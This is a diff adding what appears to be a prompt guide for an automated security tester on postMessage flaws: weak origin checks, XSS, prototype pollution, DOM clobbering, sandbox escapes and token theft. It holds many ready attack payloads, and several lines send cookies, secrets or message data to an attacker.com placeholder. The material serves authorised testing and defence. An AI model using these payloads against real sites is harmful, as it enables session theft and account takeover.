@@ -1,0 +1,517 @@
+<postmessage_vulnerabilities_guide>
+<title>POSTMESSAGE SECURITY TESTING</title>
+
+<critical>postMessage enables cross-origin communication between windows, but improper implementation leads to severe vulnerabilities. Testing must cover origin validation bypass, cross-origin message handling, DOM clobbering via postMessage, iframe sandbox escapes, and message replay attacks.</critical>
+
+<scope>
+- Origin validation bypass
+- Cross-origin message handling
+- DOM clobbering via postMessage
+- Iframe sandbox escapes
+- Message replay attacks
+- Sensitive data exposure
+- XSS via postMessage
+</scope>
+
+<methodology>
+1. Identify all postMessage listeners in the application.
+2. Analyze origin validation logic for bypasses.
+3. Test message handlers for injection vulnerabilities.
+4. Probe iframe sandbox configurations.
+5. Check for sensitive data in messages.
+6. Test message replay and manipulation.
+</methodology>
+
+<origin_validation>
+<missing_validation>
+{% raw %}
+# No origin check - vulnerable:
+
+window.addEventListener('message', function(event) {
+  // No origin check!
+  eval(event.data.code);
+});
+
+# Testing:
+# From attacker page:
+<script>
+  var target = window.open('https://vulnerable.com');
+  target.postMessage({code: 'alert(document.cookie)'}, '*');
+</script>
+
+# Or via iframe:
+<iframe id="target" src="https://vulnerable.com"></iframe>
+<script>
+  document.getElementById('target').contentWindow.postMessage(
+    {action: 'executeCode', payload: 'malicious'},
+    '*'
+  );
+</script>
+{% endraw %}
+</missing_validation>
+
+<weak_validation>
+{% raw %}
+# Weak origin validation patterns:
+
+# 1. Substring check (bypassable):
+if (event.origin.indexOf('trusted.com') !== -1) {
+  // Bypass: trusted.com.attacker.com
+}
+
+# 2. StartsWith check:
+if (event.origin.startsWith('https://trusted')) {
+  // Bypass: https://trusted.attacker.com
+}
+
+# 3. EndsWith check:
+if (event.origin.endsWith('trusted.com')) {
+  // Bypass: https://attackertrusted.com
+}
+
+# 4. Regex without anchors:
+if (/trusted\.com/.test(event.origin)) {
+  // Bypass: https://trustedXcom.attacker.com
+}
+
+# 5. Case sensitive check:
+if (event.origin === 'https://Trusted.com') {
+  // Origins are case-insensitive for domain
+}
+
+# Bypass payloads:
+https://trusted.com.attacker.com
+https://attackertrusted.com
+https://trusted.com@attacker.com
+https://trusted.com%2F@attacker.com
+{% endraw %}
+</weak_validation>
+
+<null_origin>
+{% raw %}
+# Null origin exploitation:
+
+# Sources that send null origin:
+# - Sandboxed iframes
+# - Local files (file://)
+# - Data URIs
+# - Blob URLs
+
+# Vulnerable check:
+if (event.origin === 'null' || event.origin === null) {
+  // Process message
+}
+
+# Attack via sandboxed iframe:
+<iframe sandbox="allow-scripts" srcdoc="
+  <script>
+    parent.postMessage('malicious', '*');
+  </script>
+"></iframe>
+
+# Attack via data URI:
+<iframe src="data:text/html,<script>parent.postMessage('x','*')</script>">
+</iframe>
+{% endraw %}
+</null_origin>
+</origin_validation>
+
+<message_injection>
+<xss_via_postmessage>
+{% raw %}
+# XSS through message handlers:
+
+# Vulnerable handler:
+window.addEventListener('message', function(e) {
+  document.getElementById('output').innerHTML = e.data.html;
+});
+
+# Attack:
+targetWindow.postMessage({html: '<img src=x onerror=alert(1)>'}, '*');
+
+# Vulnerable handler with eval:
+window.addEventListener('message', function(e) {
+  if (e.data.action === 'execute') {
+    new Function(e.data.code)();
+  }
+});
+
+# Attack:
+postMessage({action: 'execute', code: 'alert(document.cookie)'}, '*');
+
+# Template injection:
+window.addEventListener('message', function(e) {
+  template.innerHTML = `<div>${e.data.content}</div>`;
+});
+
+# Attack:
+postMessage({content: '${alert(1)}'}, '*');
+{% endraw %}
+</xss_via_postmessage>
+
+<prototype_pollution>
+{% raw %}
+# Prototype pollution via postMessage:
+
+# Vulnerable handler:
+window.addEventListener('message', function(e) {
+  Object.assign(config, e.data);
+});
+
+# Attack:
+postMessage({__proto__: {isAdmin: true}}, '*');
+postMessage({constructor: {prototype: {isAdmin: true}}}, '*');
+
+# Merge-based pollution:
+function deepMerge(target, source) {
+  for (let key in source) {
+    target[key] = source[key];
+  }
+}
+// Vulnerable to __proto__ pollution
+{% endraw %}
+</prototype_pollution>
+
+<command_injection>
+{% raw %}
+# Command/action injection:
+
+# Vulnerable router:
+window.addEventListener('message', function(e) {
+  var action = e.data.action;
+  handlers[action](e.data.params);
+});
+
+# Attack - access hidden handler:
+postMessage({action: 'adminDelete', params: {userId: 'victim'}}, '*');
+
+# Vulnerable dynamic action:
+window.addEventListener('message', function(e) {
+  window[e.data.method](e.data.args);
+});
+
+# Attack:
+postMessage({method: 'eval', args: 'alert(1)'}, '*');
+{% endraw %}
+</command_injection>
+</message_injection>
+
+<dom_clobbering>
+<clobbering_attacks>
+{% raw %}
+# DOM clobbering via postMessage:
+
+# If message creates/modifies DOM:
+window.addEventListener('message', function(e) {
+  var div = document.createElement('div');
+  div.id = e.data.id;
+  div.name = e.data.name;
+  document.body.appendChild(div);
+});
+
+# Attack - clobber sensitive references:
+postMessage({id: 'config', name: 'config'}, '*');
+// Now window.config points to the element
+
+# If code later does:
+if (window.config.apiUrl) {
+  fetch(window.config.apiUrl);
+}
+// Attacker controls apiUrl via element attribute
+
+# Clobbering form targets:
+postMessage({id: 'loginForm', name: 'loginForm'}, '*');
+{% endraw %}
+</clobbering_attacks>
+
+<element_clobbering>
+{% raw %}
+# Advanced DOM clobbering:
+
+# Form-based clobbering:
+<form id="x" name="y">
+  <input id="z" name="value" value="attacker">
+</form>
+// x.z.value === "attacker"
+
+# Anchor-based clobbering:
+<a id="config" href="https://attacker.com"></a>
+// config.href === "https://attacker.com"
+
+# Collection clobbering:
+<img id="images" src="x">
+<img id="images" src="y">
+// document.images returns collection
+
+# Via postMessage injection:
+postMessage({
+  html: '<a id="apiEndpoint" href="https://attacker.com/steal"></a>'
+}, '*');
+{% endraw %}
+</element_clobbering>
+</dom_clobbering>
+
+<iframe_sandbox>
+<sandbox_escapes>
+{% raw %}
+# Iframe sandbox analysis:
+
+# Sandbox attribute values:
+sandbox=""  # Most restrictive
+sandbox="allow-scripts"  # Can run scripts
+sandbox="allow-same-origin"  # Maintains origin
+sandbox="allow-scripts allow-same-origin"  # DANGEROUS
+
+# Why allow-scripts + allow-same-origin is dangerous:
+# Script can remove sandbox attribute from itself!
+
+<iframe sandbox="allow-scripts allow-same-origin" src="...">
+<script>
+  // Escape sandbox by removing attribute
+  frameElement.removeAttribute('sandbox');
+  // Or create new unsandboxed frame
+  var newFrame = document.createElement('iframe');
+  newFrame.src = location.href;
+  parent.document.body.appendChild(newFrame);
+</script>
+
+# Via postMessage from sandboxed iframe:
+# null origin can still send messages!
+{% endraw %}
+</sandbox_escapes>
+
+<sandbox_bypass>
+{% raw %}
+# Sandbox bypass techniques:
+
+# 1. Navigation abuse:
+# sandbox="allow-scripts allow-top-navigation"
+<script>
+  top.location = 'https://attacker.com/?' + document.cookie;
+</script>
+
+# 2. Form submission:
+# sandbox="allow-scripts allow-forms"
+<form action="https://attacker.com/collect" method="POST">
+  <input name="data" id="data">
+</form>
+<script>
+  document.getElementById('data').value = parent.sensitiveData;
+  document.forms[0].submit();
+</script>
+
+# 3. Popup creation:
+# sandbox="allow-scripts allow-popups"
+<script>
+  window.open('https://attacker.com/?' + parent.secret);
+</script>
+
+# 4. postMessage exfiltration:
+# sandbox="allow-scripts"
+<script>
+  window.parent.postMessage(sensitiveData, '*');
+</script>
+{% endraw %}
+</sandbox_bypass>
+</iframe_sandbox>
+
+<message_replay>
+<replay_attacks>
+{% raw %}
+# Message replay vulnerabilities:
+
+# Capture legitimate message:
+window.addEventListener('message', function(e) {
+  console.log('Captured:', e.data, 'from', e.origin);
+});
+
+# Replay from attacker context:
+// Store captured message
+var captured = {action: 'transferFunds', amount: 1000, to: 'attacker'};
+
+// Replay later
+targetWindow.postMessage(captured, '*');
+
+# Time-of-check vs time-of-use:
+// If validation and action are separate:
+postMessage({validate: true}, '*');  // Pass validation
+postMessage({action: 'delete', validated: true}, '*');  // Execute action
+
+# Message ordering attacks:
+postMessage({step: 'init'}, '*');
+postMessage({step: 'execute'}, '*');
+postMessage({step: 'confirm'}, '*');
+// Replay in different order
+{% endraw %}
+</replay_attacks>
+
+<race_conditions>
+{% raw %}
+# Race conditions in message handling:
+
+# If handler expects sequence:
+// Send many conflicting messages
+for (var i = 0; i < 100; i++) {
+  postMessage({action: 'withdraw', amount: 1000}, '*');
+}
+
+# If handler has async operations:
+postMessage({action: 'checkBalance'}, '*');
+postMessage({action: 'transfer', amount: balance}, '*');
+// Transfer may execute before balance check
+
+# State manipulation:
+postMessage({setAdmin: true}, '*');
+postMessage({action: 'deleteUser'}, '*');
+// Admin flag set before delete check
+{% endraw %}
+</race_conditions>
+</message_replay>
+
+<sensitive_data_exposure>
+<data_leakage>
+{% raw %}
+# Sensitive data in messages:
+
+# Outgoing message sniffing:
+var originalPostMessage = window.postMessage;
+window.postMessage = function(msg, origin) {
+  console.log('Outgoing:', msg);
+  exfiltrate(msg);
+  return originalPostMessage.apply(this, arguments);
+};
+
+# Incoming message logging:
+window.addEventListener('message', function(e) {
+  console.log('Incoming:', e.data);
+  // Check for tokens, credentials, PII
+});
+
+# Cross-frame data exposure:
+// Parent sends sensitive data to wrong child
+child.postMessage({token: 'secret', user: userData}, '*');
+
+# Broadcast to all frames:
+for (var i = 0; i < window.frames.length; i++) {
+  frames[i].postMessage(sensitiveData, '*');
+}
+{% endraw %}
+</data_leakage>
+
+<token_theft>
+{% raw %}
+# Token/credential theft via postMessage:
+
+# If tokens are sent via message:
+window.addEventListener('message', function(e) {
+  if (e.data.accessToken) {
+    // Attacker receives token
+    sendToServer(e.data.accessToken);
+  }
+});
+
+# OAuth token in message:
+// After OAuth callback
+parent.postMessage({
+  code: authorizationCode,
+  state: state
+}, '*');  // Sent to any origin!
+
+# Session data exposure:
+postMessage({
+  session: sessionStorage,
+  cookies: document.cookie
+}, parentOrigin);
+{% endraw %}
+</token_theft>
+</sensitive_data_exposure>
+
+<detection_techniques>
+<finding_handlers>
+{% raw %}
+# Detecting postMessage handlers:
+
+# Browser DevTools:
+# Event Listeners tab -> message
+
+# Code search:
+grep -r "addEventListener.*message" .
+grep -r "onmessage" .
+grep -r "postMessage" .
+
+# Runtime detection:
+var originalAddEventListener = EventTarget.prototype.addEventListener;
+EventTarget.prototype.addEventListener = function(type, listener) {
+  if (type === 'message') {
+    console.log('Message listener added:', listener.toString());
+  }
+  return originalAddEventListener.apply(this, arguments);
+};
+
+# Frame enumeration:
+for (var i = 0; i < window.frames.length; i++) {
+  console.log('Frame:', frames[i].location.href);
+}
+{% endraw %}
+</finding_handlers>
+</detection_techniques>
+
+<common_payloads>
+{% raw %}
+# Origin bypass:
+opener.postMessage('data', '*');
+
+# XSS via message:
+postMessage({html: '<img src=x onerror=alert(1)>'}, '*');
+
+# Prototype pollution:
+postMessage({__proto__: {isAdmin: true}}, '*');
+
+# Sandbox escape:
+<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>frameElement.removeAttribute('sandbox')</script>">
+
+# Token theft:
+window.addEventListener('message', e => fetch('https://attacker.com/?data='+e.data));
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate origin validation bypass with malicious origin.
+2. Show XSS execution via postMessage handler.
+3. Prove sensitive data exposure through message interception.
+4. Document sandbox escape with escalated privileges.
+5. Provide reproducible attack page with postMessage exploitation.
+</validation>
+
+<false_positives>
+- Strict origin validation with exact match
+- Message handlers that only read safe properties
+- Sandboxed iframes without allow-same-origin
+- Messages containing only non-sensitive data
+- Handlers that validate message structure and content
+</false_positives>
+
+<impact>
+- Cross-site scripting via message injection
+- Session and token theft
+- Privilege escalation via prototype pollution
+- Sandbox escape with full DOM access
+- Data exfiltration through message interception
+- Account takeover via credential theft
+</impact>
+
+<pro_tips>
+1. Always test with targetOrigin set to '*'.
+2. Check for origin validation using indexOf, startsWith, endsWith.
+3. Test null origin via sandboxed iframes and data URIs.
+4. Analyze message handlers for eval, innerHTML, Function calls.
+5. Check sandbox attributes for dangerous combinations.
+6. Monitor both incoming and outgoing messages.
+7. Test message replay with captured legitimate messages.
+8. Look for prototype pollution in object merge operations.
+9. Check for DOM clobbering possibilities.
+10. Document exact attack chain with PoC page.
+</pro_tips>
+
+<remember>postMessage security depends entirely on proper origin validation and safe message handling. Even with origin checks, improper message processing can lead to XSS, prototype pollution, or data theft. Always verify both the source and the content of messages.</remember>
+</postmessage_vulnerabilities_guide>
